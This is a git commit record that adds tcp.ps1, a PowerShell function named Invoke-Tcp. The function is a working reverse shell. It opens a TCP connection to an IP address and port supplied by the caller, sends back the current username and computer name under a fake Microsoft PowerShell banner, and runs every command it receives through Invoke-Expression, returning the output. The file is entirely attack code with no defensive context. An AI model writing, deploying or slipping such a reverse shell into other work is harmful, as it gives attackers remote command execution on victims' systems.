1ee78c95c77be6eb116cdccc8a39b828aac8fda6
unknown <klimenko.eduard@gmail.com>
2025-09-25 17:01:55 -0700

    invoke-tcp added

---
+++ tcp.ps1
@@ -0,0 +1,71 @@
+function Invoke-Tcp 
+{ 
+   
+    [CmdletBinding(DefaultParameterSetName="r")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="r")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="r")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="r")]
+        [Switch]
+        $Reverse
+    )
+
+    
+    try 
+    {
+        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "errorx" 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "errorx" 
+        Write-Error $_
+    }
+}
+
